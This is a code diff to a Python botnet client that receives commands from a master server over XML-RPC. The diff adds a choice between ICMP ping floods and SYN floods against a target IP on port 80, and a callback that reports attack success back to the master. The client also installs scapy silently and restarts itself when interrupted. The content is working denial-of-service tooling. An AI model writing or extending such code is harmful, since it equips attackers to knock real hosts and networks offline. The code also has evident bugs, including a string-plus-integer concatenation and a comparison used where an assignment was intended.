@@ -8,7 +8,7 @@ from xmlrpc.server import SimpleXMLRPCServer, SimpleXMLRPCRequestHandler
 from socketserver import ThreadingMixIn
 
 try:
-    from scapy.all import *
+    import scapy
 except:
     os.system("pip install scapy")
 
@@ -69,9 +69,17 @@ class BotNet:
                 os.system("python syn_attack.py " +
                           message["target_ip"] + 80 + str(message["number_of_attack"]))
         elif (self.get_platform().lower() == "windows"):
-            os.system("ping "+message["target_ip"] +
-                      " -l 65500 -n " + str(message["number_of_attack"]))
+            if message["attack_type"] == "icmp":
+                os.system("ping "+message["target_ip"] +
+                          " -l 65500 -n " + str(message["number_of_attack"]))
+            elif message["attack_type"] == "syn":
+                os.system("python syn_attack.py " +
+                          message["target_ip"] + " " + str(80) + " " + str(message["number_of_attack"]))
         self.isAttack == False
+        self.informMaster(message["target_ip"], "success")
+
+    def informMaster(self, target, status):
+        self.client.inform_master(getIpAddress(), target, status)
 
 
 if __name__ == '__main__':
@@ -83,5 +91,4 @@ if __name__ == '__main__':
         botnet.listenMaster()
     except KeyboardInterrupt:
         botnet.client.unregister_ip(ip_address)
-        # sys.exit(0)
         os.system("python main_botnet.py")
